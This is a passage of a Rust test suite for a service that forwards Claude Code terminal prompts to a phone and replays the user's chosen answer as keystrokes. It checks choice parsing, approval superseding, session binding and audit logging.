    assert!(state.get("approvalId").is_none() && state.get("enc").is_none());
    assert_eq!(alerting(&sent).len(), 2);
}

#[tokio::test]
async fn a_failed_activity_alert_falls_back_to_the_notification() {
    for rejection in [
        Rejection::Unregistered,
        Rejection::Other("503 ServiceUnavailable".into()),
    ] {
        let mut rig = Rig::start(TTL).await;
        rig.follow();
        *rig.apns.live_fails.lock().unwrap() = Some(rejection.clone());
        let a = rig.ticked_needed().await;
        let sent = rig.sent().await;
        assert_eq!(rig.apns.live_attempts.load(Ordering::SeqCst), 1);
        assert_eq!(sent.len(), 1, "{rejection}");
        let (to, alert) = &sent[0];
        assert_eq!(to, token().as_str());
        assert_eq!(alert.delivery, Delivery::Alert);
        assert_eq!(alert.payload["approval_id"], a.approval_id.as_str());
        assert_eq!(open_context(&rig.notification_key, &alert.payload)["v"], 1);
        assert_eq!(
            rig.push.activities().is_empty(),
            rejection == Rejection::Unregistered,
            "only a dead token is dropped"
        );

        for _ in 0..3 {
            rig.tick().await;
        }
        assert_eq!(alerting(&rig.sent().await).len(), 1, "{rejection}");
    }
}

#[tokio::test]
async fn an_activity_without_approvals_keeps_the_notification() {
    let mut rig = Rig::start(TTL).await;
    rig.push
        .register_activity(
            PHONE,
            ActivityId::new("ACT-1").unwrap(),
            TerminalId::new(TERMINAL).unwrap(),
            activity_token(),
            false,
            Some(display_binding()),
            None,
        )
        .unwrap();
    let a = rig.ticked_needed().await;
    let sent = rig.sent().await;
    let alerts = alerting(&sent);
    assert_eq!(alerts.len(), 1, "{sent:?}");
    assert_eq!(alerts[0].0, token().as_str());
    assert_eq!(alerts[0].1.delivery, Delivery::Alert);
    assert_eq!(alerts[0].1.payload["approval_id"], a.approval_id.as_str());
    let (to, live) = sent.last().unwrap();
    assert_eq!(
        to,
        activity_token().as_str(),
        "the activity still shows the status"
    );
    let state = &open_display(&rig.notification_key, &live.payload, 2)["state"];
    assert_eq!(state["status"], "blocked");
    assert!(state.get("approvalId").is_none() && state.get("enc").is_none());
}

fn choice_labels(a: &Approval) -> Vec<(u8, String, bool)> {
    a.choices
        .iter()
        .map(|c| (c.index, c.label.clone(), c.current))
        .collect()
}

#[tokio::test]
async fn a_question_is_answered_by_choosing_an_option() {
    let mut rig = Rig::start(TTL).await;
    rig.transcript(&asking(ASKS));
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = QUESTION.into();
    });
    let a = rig.needed().await;
    assert!(a.options.is_empty());
    assert_eq!(
        choice_labels(&a),
        [
            (0, "SQLite".to_owned(), true),
            (1, "Redis".to_owned(), false),
            (2, "Type something.".to_owned(), false),
        ]
    );
    assert_eq!(
        a.choices[1].detail.as_deref(),
        Some("Shared across processes")
    );
    let alerts = rig.alerts(1).await;
    assert!(alerts[0].1.payload["aps"].get("category").is_none());

    let outcome = resolved(rig.choose(&a, 1, &a.nonce).await);
    assert_eq!(
        outcome,
        ApprovalOutcome::Chosen {
            choice: 1,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved { approval_id, outcome: ApprovalOutcome::Chosen { choice: 1, .. } }
            if approval_id == a.approval_id
    ));
    assert_eq!(
        rig.audit()[0]["result"],
        format!("choose 1: applied terminal={TERMINAL} keys=down,enter")
    );
    assert_eq!(
        code(rig.choose(&a, 1, &a.nonce).await),
        ErrorCode::ApprovalAlreadyResolved
    );

    rig.herdr.with(|h| {
        h.unblock_on_keys = false;
        h.text = QUESTION.into();
        set_status(h, "blocked");
    });
    let b = rig.needed().await;
    assert_eq!(
        resolved(rig.choose(&b, 0, &b.nonce).await),
        ApprovalOutcome::ChosenUnconfirmed {
            choice: 0,
            by: LABEL.into()
        },
        "Enter alone, the cursor is already there"
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys")[2],
        json!({"target": "w7:p1", "keys": ["enter"]})
    );
}

#[tokio::test]
async fn a_question_form_is_answered_only_as_its_transcript_asks_it() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| h.rule = "live_blocked_form".into());
    let show = |rig: &Rig, (screen, transcript): (&str, &str)| {
        rig.transcript(transcript);
        rig.herdr.with(|h| {
            h.text = screen.into();
            set_status(h, "blocked");
        });
    };
    let one = [
        "SQLite",
        "Redis",
        "Memory",
        "Type something.",
        "Chat about this",
    ];
    let multi = [
        "[ ] Lint",
        "[ ] Tests",
        "[ ] Schema",
        "[ ] Type something",
        "Chat about this",
    ];
    for ((screen, transcript), labels) in [
        (ASKED_ONE, &one[..]),
        (ASKED_MULTI, &multi[..]),
        (ASKED_REVIEW, &["Submit answers", "Cancel"][..]),
        // It scrolls: nothing, whatever the transcript says.
        (ASKED_TALL, &[][..]),
    ] {
        // No transcript, the capture's own, whose call is older than this process, then that
        // call made since.
        let made = fresh(transcript);
        for (transcript, labels) in [("", &[][..]), (transcript, &[][..]), (&made, labels)] {
            show(&rig, (screen, transcript));
            let a = rig.needed().await;
            let shown: Vec<&str> = a.choices.iter().map(|c| c.label.as_str()).collect();
            assert_eq!(shown, labels, "{screen}");
            assert_eq!(a.accepts_input, !labels.is_empty(), "{screen}");
            assert!(a.options.is_empty() && !a.snippet.is_empty(), "{screen}");
        }
    }
    // Another call's form: one question on screen, the call with two in the transcript.
    show(&rig, (ASKED_ONE.0, &fresh(ASKED_REVIEW.1)));
    let a = rig.needed().await;
    assert!(a.choices.is_empty() && !a.accepts_input && !a.has_text_field);
    assert_eq!(
        code(rig.choose(&a, 0, &a.nonce).await),
        ErrorCode::InvalidParams
    );
    assert!(rig.mutations().is_empty());

    // The call got its result since the approval, as when the question is answered on the
    // Mac: the decision reads the transcript again and sends no key.
    let asked = fresh(ASKED_ONE.1);
    show(&rig, (ASKED_ONE.0, &asked));
    let a = rig.needed().await;
    let result = json!({"type": "user", "message": {"content": [
        {"type": "tool_result", "tool_use_id": "toolu_scrubbed_1"},
    ]}});
    rig.transcript(&format!("{asked}{result}\n"));
    assert_eq!(
        resolved(rig.choose(&a, 1, &a.nonce).await),
        ApprovalOutcome::Superseded
    );
    assert!(rig.mutations().is_empty());
    rig.transcript(&asked);
    let b = rig.needed().await;
    // That call ended and another asks the same question, the screen the same: the approval
    // was for the first call.
    assert_ne!(asked, asked.replace("toolu_scrubbed_1", "toolu_next"));
    rig.transcript(&asked.replace("toolu_scrubbed_1", "toolu_next"));
    assert_eq!(
        resolved(rig.choose(&b, 1, &b.nonce).await),
        ApprovalOutcome::Superseded
    );
    assert!(rig.mutations().is_empty());
    let b = rig.needed().await;
    assert_eq!(
        resolved(rig.choose(&b, 1, &b.nonce).await),
        ApprovalOutcome::Chosen {
            choice: 1,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
}

#[tokio::test]
async fn a_menu_with_no_approval_is_no_permission_prompt_without_its_call() {
    let mut rig = Rig::start(TTL).await;
    let show = |rig: &Rig, rule: &str, screen: &str, transcript: &str| {
        rig.transcript(transcript);
        rig.herdr.with(|h| {
            h.rule = rule.into();
            h.text = screen.into();
            set_status(h, "blocked");
        });
    };
    // Hand-built from the 2.1.289 capture: a question whose options read as decisions and
    // approve nothing. Not known what the session waits on, then known to wait on nothing,
    // on a Bash call, then on that question.
    let deferred = QUESTION_LIVE
        .replace("1. SQLite", "1. No, defer")
        .replace("2. Redis", "2. Later");
    let (question, options) = ASKS_LIVE[0];
    let asked = [("No, defer", options[0].1), ("Later", options[1].1)];
    let asked = asking(&[(question, &asked[..])]);
    // Nor does a call that is no question make it another dialog: it is drawn as a question.
    let bash = fresh(ASKED_BASH.1);
    for (transcript, choices) in [(CUT, 0), ("", 0), (&*bash, 0), (&*asked, 4)] {
        show(&rig, "live_blocked_form", &deferred, transcript);
        let a = rig.needed().await;
        assert_eq!(a.choices.len(), choices, "{transcript}");
        assert!(a.options.is_empty() && !a.accepts_input && !a.has_text_field);
    }

    // Not drawn as a question, and no dialog its wording tells: (hand-built) QUESTION without
    // its `Type something.`, ordinary labels under a cursor set in by a column. Nothing is
    // offered, whether or not another call is pending.
    let (plain, _) = QUESTION.split_once("   3. Type something.\n").unwrap();
    for transcript in [CUT, &*bash] {
        show(&rig, "live_blocked_form", plain, transcript);
        let a = rig.needed().await;
        assert!(a.options.is_empty() && a.choices.is_empty() && !a.accepts_input);
    }
    // Not known: the plan prompt is told by its wording, a permission prompt by its approval.
    show(&rig, "legacy_no_prompt_blocker", ASKED_PLAN.0, CUT);
    assert_eq!(rig.needed().await.choices.len(), 3);
    show(&rig, "bash_permission_prompt", ASKED_BASH.0, CUT);
    assert_eq!(rig.needed().await.options.len(), 3);
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn the_workflow_prompt_is_decided_as_a_permission_prompt() {
    // `Yes, run it` approves and `No` denies, whatever the transcript says of the session: no
    // transcript, what it waits on not known, nothing, or a call that is no question.
    let workflow = json!({"type": "assistant", "sessionId": SESSION, "message": {"content": [
        {"type": "tool_use", "id": "toolu_1", "name": "Workflow", "input": {}},
    ]}});
    let pending = fresh(&workflow.to_string());
    let mut rig = Rig::start(TTL).await;
    rig.herdr
        .with(|h| h.rule = "dynamic_workflow_prompt".into());
    let mut last = None;
    for transcript in [None, Some(CUT), Some(""), Some(&*pending)] {
        if let Some(text) = transcript {
            rig.transcript(text);
        }
        rig.herdr.with(|h| {
            h.text = WORKFLOW.into();
            set_status(h, "blocked");
        });
        let a = rig.needed().await;
        assert_eq!(
            a.options,
            [Decision::Approve, Decision::Deny],
            "{transcript:?}"
        );
        last = Some(a);
    }
    // `View raw script` is listed and is no decision; with decisions offered no option is
    // pressed by index.
    let a = last.unwrap();
    let labels: Vec<&str> = a.choices.iter().map(|c| c.label.as_str()).collect();
    assert_eq!(labels, ["Yes, run it", "View raw script", "No"]);
    assert_eq!(
        code(rig.choose(&a, 1, &a.nonce).await),
        ErrorCode::InvalidParams
    );
    assert!(rig.mutations().is_empty());
    let b = rig.needed().await;
    assert_eq!(
        resolved(rig.decide(&b, Decision::Deny, &b.nonce).await),
        ApprovalOutcome::Applied {
            decision: Decision::Deny,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down", "down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
}

#[tokio::test]
async fn a_menu_drawn_as_a_question_is_one_whatever_its_labels_read() {
    // Hand-built from the 2.1.329 capture, its cursor at column 0 and Claude Code's own
    // entries under its options: an option worded as an amend field, one worded as an
    // approval, the form worded as the plan prompt, and an option worded as the workflow
    // prompt's approval. What the session waits on is not known, then known to be nothing.
    let one = ASKED_ONE.0;
    let asks = "\nWhich cache backend should we use?\n";
    let screens = [
        one.replace("1. SQLite", "1. Yes, and tell Claude what to do next"),
        one.replace("1. SQLite\n     Simple and embedded\n", "1. Yes\n"),
        one.replacen(asks, "\nWould you like to proceed?\n", 1)
            .replace("1. SQLite", "1. Yes, and use auto mode"),
        one.replace("1. SQLite\n     Simple and embedded\n", "1. Yes, run it\n"),
    ];
    let mut read = Vec::new();
    for screen in &screens {
        assert_ne!(screen, one);
        let mut rig = Rig::start(TTL).await;
        rig.herdr.with(|h| h.rule = "live_blocked_form".into());
        for transcript in [CUT, ""] {
            rig.transcript(transcript);
            rig.herdr.with(|h| {
                h.text = screen.clone();
                set_status(h, "blocked");
            });
            let a = rig.needed().await;
            let chosen = rig.choose(&a, 0, &a.nonce).await;
            read.push((
                (a.options.len(), a.choices.len()),
                (a.accepts_input, a.has_text_field),
                matches!(chosen, Err((ErrorCode::InvalidParams, _))),
                rig.mutations().len(),
            ));
        }
    }
    assert_eq!(read, [((0, 0), (false, false), true, 0); 8]);
}

#[tokio::test]
async fn a_question_in_code_mode_is_matched_to_the_pending_script() {
    let mut rig = Rig::start(TTL).await;
    let show = |rig: &Rig, rule: &str, screen: &str, transcript: &str| {
        rig.transcript(transcript);
        rig.herdr.with(|h| {
            h.rule = rule.into();
            h.text = screen.into();
            set_status(h, "blocked");
        });
    };
    for ((screen, transcript), labels) in [
        (SCRIPTED, ["Option A", "Option B"]),
        (SCRIPTED_BUILT, ["Red", "Blue"]),
    ] {
        show(&rig, "live_blocked_form", screen, &fresh(transcript));
        let a = rig.needed().await;
        let shown: Vec<&str> = a.choices.iter().map(|c| c.label.as_str()).collect();
        let own = ["Type something.", "Chat about this"];
        assert_eq!(shown, [&labels[..], &own[..]].concat());
        assert!(a.options.is_empty() && a.accepts_input && a.has_text_field);
    }
    // A question the script does not hold, and a script that asks none.
    let script = fresh(SCRIPTED.1);
    show(&rig, "live_blocked_form", SCRIPTED_BUILT.0, &script);
    assert!(rig.needed().await.choices.is_empty());
    let silent = script.replace("AskUserQuestion", "Bash");
    show(&rig, "live_blocked_form", SCRIPTED.0, &silent);
    assert!(rig.needed().await.choices.is_empty());
    // The script is pending through every call it makes: a permission prompt beside it is
    // decided as ever.
    show(&rig, "bash_permission_prompt", ASKED_BASH.0, &script);
    let a = rig.needed().await;
    assert_eq!(
        a.options,
        [Decision::Approve, Decision::ApproveAlways, Decision::Deny]
    );

    // The approval is for that script's call: another call with the same code is another.
    show(&rig, "live_blocked_form", SCRIPTED.0, &script);
    let a = rig.needed().await;
    assert_ne!(script, script.replace("toolu_scrubbed_0", "toolu_next"));
    rig.transcript(&script.replace("toolu_scrubbed_0", "toolu_next"));
    assert_eq!(
        resolved(rig.choose(&a, 1, &a.nonce).await),
        ApprovalOutcome::Superseded
    );
    assert!(rig.mutations().is_empty());
    let b = rig.needed().await;
    assert_eq!(
        resolved(rig.choose(&b, 1, &b.nonce).await),
        ApprovalOutcome::Chosen {
            choice: 1,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
}

#[tokio::test]
async fn a_question_approval_is_bound_to_its_session() {
    let mut rig = Rig::start(TTL).await;
    let asked = fresh(ASKED_ONE.1);
    rig.transcript(&asked);
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = ASKED_ONE.0.into();
    });
    let a = rig.needed().await;
    assert_eq!(a.choices.len(), 5);
    // The terminal's process moves to another session whose transcript holds the same call
    // under the same id, as a copy of the first would: the screen, the question and the call
    // id are the same, and the approval was for the first session.
    let other = "11111111-0000-4000-8000-000000000000";
    rig.session(other, &asked.replace(SESSION, other));
    assert_eq!(
        resolved(rig.choose(&a, 1, &a.nonce).await),
        ApprovalOutcome::Superseded
    );
    assert!(rig.mutations().is_empty());
    let b = rig.needed().await;
    assert!(matches!(
        resolved(rig.choose(&b, 1, &b.nonce).await),
        ApprovalOutcome::Chosen { choice: 1, .. }
    ));
}

#[tokio::test]
async fn a_note_is_typed_when_yes_is_the_only_approval() {
    // Tab turns `Yes` into its amend field and the note into `Yes, <note>`: no option reads as
    // an approval any more, on the same permission prompt. Whatever the transcript says of
    // the session: what it waits on not known, nothing, or the Edit call.
    let edit = json!({"type": "assistant", "sessionId": SESSION, "message": {"content": [
        {"type": "tool_use", "id": "toolu_1", "name": "Edit", "input": {}},
    ]}});
    let note = "keep the old name";
    for transcript in [CUT, "", &fresh(&edit.to_string())] {
        let mut rig = Rig::start(TTL).await;
        rig.transcript(transcript);
        rig.herdr.with(|h| {
            h.rule = "generic_permission_prompt".into();
            h.text = EDIT.into();
        });
        let a = rig.needed().await;
        assert_eq!(a.options, [Decision::Approve, Decision::Deny]);
        let outcome = resolved(
            rig.decide_with_note(&a, Decision::Approve, note, yes())
                .await,
        );
        assert_eq!(
            outcome,
            ApprovalOutcome::Applied {
                decision: Decision::Approve,
                by: LABEL.into()
            },
            "{transcript}"
        );
        assert_eq!(
            rig.herdr.params("pane.send_text"),
            [json!({"pane_id": "w7:p1", "text": note})]
        );
    }
    // The same prompt left in its amend state, as after Tab on the Mac (hand-built from the
    // capture): its options are listed, with no decision, as a permission prompt's are.
    let mut rig = Rig::start(TTL).await;
    let amended = EDIT.replace("1. Yes\n", "1. Yes, and tell Claude what to do next\n");
    assert_ne!(amended, EDIT);
    rig.herdr.with(|h| {
        h.rule = "generic_permission_prompt".into();
        h.text = amended;
    });
    let a = rig.needed().await;
    assert!(a.options.is_empty() && a.choices.len() == 3);
}

#[derive(Clone, Default)]
struct Logs(Arc<Mutex<Vec<u8>>>);

impl std::io::Write for Logs {
    fn write(&mut self, bytes: &[u8]) -> std::io::Result<usize> {
        self.0.lock().unwrap().extend_from_slice(bytes);
        Ok(bytes.len())
    }

    fn flush(&mut self) -> std::io::Result<()> {
        Ok(())
    }
}

#[tokio::test]
async fn a_refused_question_form_is_logged_once_with_its_reason() {
    let logs = Logs::default();
    let writer = logs.clone();
    let subscriber = tracing_subscriber::fmt()
        .with_ansi(false)
        .with_writer(move || writer.clone())
        .finish();
    let _logging = tracing::subscriber::set_default(subscriber);
    let refusals = || {
        let text = String::from_utf8_lossy(&logs.0.lock().unwrap()).into_owned();
        let refusal = |l: &&str| l.contains("question form not answered from the phone");
        let lines = text.lines().filter(refusal).map(str::to_owned);
        lines.collect::<Vec<_>>()
    };
    let mut rig = Rig::start(TTL).await;
    let show = |rig: &Rig, rule: &str, screen: &str, transcript: &str| {
        rig.transcript(transcript);
        rig.herdr.with(|h| {
            h.rule = rule.into();
            h.text = screen.into();
            set_status(h, "blocked");
        });
    };
    show(&rig, "bash_permission_prompt", ASKED_BASH.0, CUT);
    rig.needed().await;
    assert!(refusals().is_empty(), "a permission prompt is no question");

    show(&rig, "live_blocked_form", ASKED_ONE.0, CUT);
    let first = rig.needed().await;
    // The cursor moves in the refused form: another approval for the same dialog, no line.
    rig.herdr.with(|h| h.text = move_cursor(&h.text, 1));
    for _ in 0..3 {
        rig.observe().await;
    }
    assert_ne!(rig.approvals.pending()[0].approval_id, first.approval_id);
    show(&rig, "live_blocked_form", ASKED_MULTI.0, ASKED_MULTI.1);
    rig.needed().await;
    show(
        &rig,
        "live_blocked_form",
        ASKED_REVIEW.0,
        &fresh(ASKED_ONE.1),
    );
    rig.needed().await;
    // The question from under its top rule, as a terminal one row too short for it would
    // show it (hand-built from the capture), its call pending: it draws the call whole and
    // has no top.
    let tall = &ASKED_ONE.0[ASKED_ONE.0.find(" ☐ Cache\n").unwrap()..];
    show(&rig, "live_blocked_form", tall, &fresh(ASKED_ONE.1));
    assert!(rig.needed().await.choices.is_empty());
    // A call that is no question, and a Code Mode script that asks another question.
    show(&rig, "live_blocked_form", ASKED_ONE.0, &fresh(ASKED_BASH.1));
    rig.needed().await;
    show(&rig, "live_blocked_form", ASKED_ONE.0, &fresh(SCRIPTED.1));
    rig.needed().await;
    let lines = refusals();
    let reasons = [
        "transcript unreadable or incomplete",
        "stale call",
        "question not drawn whole",
        "question not drawn whole",
        "another call pending",
        "question not found in the pending script",
    ];
    assert_eq!(lines.len(), reasons.len(), "{lines:?}");
    for (line, reason) in lines.iter().zip(reasons) {
        assert!(line.contains("WARN") && line.contains(TERMINAL), "{line}");
        assert!(line.contains(reason), "{line}");
        for told in ["cache", "SQLite", "Lint", "planlab", SESSION] {
            assert!(!line.contains(told), "{line}");
        }
    }
}

#[tokio::test]
async fn permission_and_plan_prompts_read_the_same_beside_their_transcripts() {
    let mut rig = Rig::start(TTL).await;
    let show = |rig: &Rig, rule: &str, (screen, transcript): (&str, &str)| {
        rig.transcript(transcript);
        rig.herdr.with(|h| {
            h.rule = rule.into();
            h.text = screen.into();
            set_status(h, "blocked");
        });
    };
    for (rule, (screen, transcript)) in [
        ("bash_permission_prompt", ASKED_BASH),
        ("legacy_no_prompt_blocker", ASKED_PLAN),
    ] {
        let mut read = Vec::new();
        for transcript in ["", &fresh(transcript)] {
            show(&rig, rule, (screen, transcript));
            let a = rig.needed().await;
            let labels: Vec<String> = a.choices.iter().map(|c| c.label.clone()).collect();
            read.push((
                a.options,
                labels,
                a.tool.map(|t| t.name),
                a.snippet,
                (a.accepts_input, a.has_text_field, a.supports_note),
            ));
        }
        assert_eq!(read[0], read[1], "{rule}");
        let (options, labels, tool, _, flags) = &read[0];
        if rule == "bash_permission_prompt" {
            assert_eq!(
                options[..],
                [Decision::Approve, Decision::ApproveAlways, Decision::Deny]
            );
            assert_eq!(
                labels[1],
                "Yes, and always allow access to /private/tmp/planlab from this project"
            );
            assert_eq!(
                (tool.as_deref(), *flags),
                (Some("Bash"), (false, false, true))
            );
        } else {
            assert!(options.is_empty());
            assert_eq!(
                labels[..],
                [
                    "Yes, and use auto mode",
                    "Yes, manually approve edits",
                    "Tell Claude what to change"
                ]
            );
            assert_eq!(*flags, (false, true, false));
        }
    }
    // While the session waits on a question, a dialog that does not draw it gets no answer: a
    // question whose labels read as decisions is drawn like a permission prompt.
    show(
        &rig,
        "bash_permission_prompt",
        (ASKED_BASH.0, &asking(ASKS)),
    );
    let a = rig.needed().await;
    assert!(a.options.is_empty() && a.choices.is_empty());
    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ErrorCode::InvalidParams
    );
    assert!(rig.mutations().is_empty());
}

#[tokio::test]
async fn a_question_in_a_renamed_session_is_answered_by_choosing_an_option() {
    let mut rig = Rig::start(TTL).await;
    rig.transcript(&asking(ASKS_RENAMED));
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form_named_session".into();
        h.text = RENAMED_QUESTION.into();
    });
    let a = rig.needed().await;
    assert!(a.options.is_empty());
    assert_eq!(
        choice_labels(&a),
        [
            (0, "Red".to_owned(), true),
            (1, "Green".to_owned(), false),
            (2, "Blue".to_owned(), false),
            (3, "Type something.".to_owned(), false),
            (4, "Chat about this".to_owned(), false),
        ]
    );
    assert_eq!(a.choices[1].detail.as_deref(), Some("Pick green"));
    assert_eq!(a.snippet, "☐ Color\nWhich color do you prefer?");
    assert!(a.accepts_input && a.has_text_field);
    let alerts = rig.alerts(1).await;
    assert_eq!(
        open_context(&rig.notification_key, &alerts[0].1.payload),
        json!({"v": 1, "body": "Which color do you prefer?"})
    );

    assert_eq!(
        resolved(rig.choose(&a, 1, &a.nonce).await),
        ApprovalOutcome::Chosen {
            choice: 1,
            by: LABEL.into()
        }
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
}

#[tokio::test]
async fn a_menu_typed_into_a_renamed_session_box_is_answered_in_the_terminal() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form_named_session".into();
        h.text = "❯ earlier prompt\n\n────────────── demo-session ─\n❯ 1. Yes\n  2. No\n  Enter to confirm · Esc to cancel\n──────────────────────────────\n".into();
    });
    let a = rig.needed().await;
    assert!(a.options.is_empty() && a.choices.is_empty());
    assert!(!a.accepts_input && !a.has_text_field);
    assert_eq!(
        code(rig.decide(&a, Decision::Approve, &a.nonce).await),
        ErrorCode::InvalidParams
    );
    assert!(rig.herdr.params("agent.send_keys").is_empty());
}

#[tokio::test]
async fn a_plan_is_chosen_with_arrows_never_esc() {
    let mut rig = Rig::start(TTL).await;
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = PLAN.into();
    });
    let a = rig.needed().await;
    assert!(
        a.options.is_empty(),
        "no approve option: not a permission prompt"
    );
    assert_eq!(
        choice_labels(&a),
        [
            (0, "Yes, and auto-accept edits".to_owned(), true),
            (1, "Yes, and manually approve edits".to_owned(), false),
            (2, "No, keep planning".to_owned(), false),
        ]
    );
    assert_eq!(
        code(rig.decide(&a, Decision::Deny, &a.nonce).await),
        ErrorCode::InvalidParams
    );
    let b = rig.needed().await;
    assert!(matches!(
        resolved(rig.choose(&b, 2, &b.nonce).await),
        ApprovalOutcome::Chosen { choice: 2, .. }
    ));
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down", "down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
        ]
    );
}

#[tokio::test]
async fn the_unnumbered_trust_prompt_is_decided_like_a_numbered_one() {
    let mut rig = Rig::start(TTL).await;
    let trust = |h: &mut Herdr| {
        h.rule = "live_blocked_form".into();
        h.text = TRUST_292.into();
        set_status(h, "blocked");
    };
    rig.herdr.with(trust);
    let a = rig.needed().await;
    assert_eq!(a.options, [Decision::Approve, Decision::Deny]);
    assert_eq!(
        choice_labels(&a),
        [
            (0, TRUST_OPTIONS[0].to_owned(), true),
            (1, TRUST_OPTIONS[1].to_owned(), false),
        ]
    );
    assert!(!a.accepts_input && !a.has_text_field && !a.supports_note);
    assert_eq!(
        code(rig.choose(&a, 1, &a.nonce).await),
        ErrorCode::InvalidParams,
        "decided, never chosen by index"
    );

    rig.herdr.with(trust);
    let b = rig.needed().await;
    assert!(matches!(
        resolved(rig.decide(&b, Decision::Approve, &b.nonce).await),
        ApprovalOutcome::Applied { .. }
    ));
    rig.herdr.with(trust);
    let c = rig.needed().await;
    resolved(rig.decide(&c, Decision::Deny, &c.nonce).await);
    rig.herdr.with(|h| {
        trust(h);
        h.arrows_move = false;
    });
    let d = rig.needed().await;
    assert_eq!(
        resolved(rig.decide(&d, Decision::Approve, &d.nonce).await),
        ApprovalOutcome::Superseded
    );
    assert_eq!(
        rig.herdr.params("agent.send_keys"),
        [
            json!({"target": "w7:p1", "keys": ["down"]}),
            json!({"target": "w7:p1", "keys": ["enter"]}),
            json!({"target": "w7:p1", "keys": ["esc"]}),
            json!({"target": "w7:p1", "keys": ["down"]}),
        ]
    );
    let results: Vec<Value> = rig.audit().iter().map(|e| e["result"].clone()).collect();
    assert_eq!(
        results,
        [
            "choose 1: rejected: choice not offered".to_owned(),
            format!("approve: applied terminal={TERMINAL} keys=down,enter"),
            format!("deny: applied terminal={TERMINAL} keys=esc"),
            format!("approve: superseded: cursor not on target terminal={TERMINAL} keys=down"),
        ]
    );
}

#[tokio::test]
async fn approvals_say_whether_keys_and_text_are_taken() {
    let mut rig = Rig::start(TTL).await;
    let two = BASH.replace(
        "   2. Yes, and don't ask again for rm commands in /Users/me/src/app\n",
        "",
    );
    let two = two.replace("3. No", "2. No").replace(" · Tab to amend", "");
    let (asked_live, asked, asked_multi) = (asking(ASKS_LIVE), asking(ASKS), fresh(ASKED_MULTI.1));
    for (rule, text, transcript, input, field, note) in [
        (
            "live_blocked_form",
            QUESTION_LIVE,
            &*asked_live,
            true,
            true,
            false,
        ),
        ("live_blocked_form", QUESTION, &*asked, true, true, false),
        ("live_blocked_form", PLAN, "", false, false, false),
        ("live_blocked_form", TRUST_LIVE, "", false, false, false),
        ("live_blocked_form", TRUST_292, "", false, false, false),
        ("bash_permission_prompt", BASH, "", false, false, true),
        ("bash_permission_prompt", &two, "", false, false, false),
        ("live_blocked_form", BASH, "", false, false, true),
        ("bash_permission_prompt", BASH_LIVE, "", false, false, true),
        (
            "legacy_no_prompt_blocker",
            PLAN_LIVE,
            "",
            false,
            true,
            false,
        ),
        ("live_blocked_form", PLAN_LIVE, "", false, false, false),
        ("mcp_elicitation_prompt", BASH_LIVE, "", false, false, false),
        // A multi-select question has no `Type something.` field.
        (
            "live_blocked_form",
            ASKED_MULTI.0,
            &*asked_multi,
            true,
            false,
            false,
        ),
    ] {
        rig.transcript(transcript);
        rig.herdr.with(|h| {
            h.rule = rule.into();
            h.text = text.into();
            set_status(h, "blocked");
        });
        let a = rig.needed().await;
        assert_eq!(
            (a.accepts_input, a.has_text_field, a.supports_note),
            (input, field, note),
            "{rule} {text}"
        );
    }
}

#[tokio::test]
async fn choices_are_refused_where_a_decision_is_offered_or_out_of_range() {
    let mut rig = Rig::start(TTL).await;
    let a = rig.needed().await;
    assert_eq!(a.choices.len(), 3);
    assert_eq!(
        code(rig.choose(&a, 0, &a.nonce).await),
        ErrorCode::InvalidParams,
        "a permission prompt is answered with its decisions only"
    );
    assert!(matches!(
        rig.event().await,
        Event::ApprovalResolved {
            outcome: ApprovalOutcome::Superseded,
            ..
        }
    ));

    rig.transcript(&asking(ASKS));
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = QUESTION.into();
        set_status(h, "blocked");
    });
    let b = rig.needed().await;
    assert_eq!(b.choices.len(), 3);
    assert_eq!(
        code(rig.choose(&b, 3, &b.nonce).await),
        ErrorCode::InvalidParams
    );
    let c = rig.needed().await;
    assert_eq!(
        code(rig.decide(&c, Decision::Choose, &c.nonce).await),
        ErrorCode::InvalidParams,
        "choose without a choice"
    );
    assert!(rig.mutations().is_empty());
    let results: Vec<Value> = rig.audit().iter().map(|e| e["result"].clone()).collect();
    assert_eq!(
        results,
        [
            "choose 0: rejected: choice not offered",
            "choose 3: rejected: choice not offered",
            "choose: rejected: decision not offered",
        ]
    );
}

#[tokio::test]
async fn a_changed_question_supersedes_the_choice() {
    let mut rig = Rig::start(TTL).await;
    rig.transcript(&asking(ASKS));
    rig.herdr.with(|h| {
        h.rule = "live_blocked_form".into();
        h.text = QUESTION.into();
    });
    let a = rig.needed().await;
    let (question, options) = ASKS[0];
    let changed = [options[0], ("Postgres", options[1].1)];
    rig.transcript(&asking(&[(question, &changed[..])]));
    rig.herdr
        .with(|h| h.text = QUESTION.replace("2. Redis", "2. Postgres"));
    assert_eq!(
        resolved(rig.choose(&a, 1, &a.nonce).await),
        ApprovalOutcome::Superseded
    );
    assert!(rig.mutations().is_empty());

    let b = rig.needed().await;
    rig.herdr.with(|h| h.arrows_move = false);
    assert_eq!(
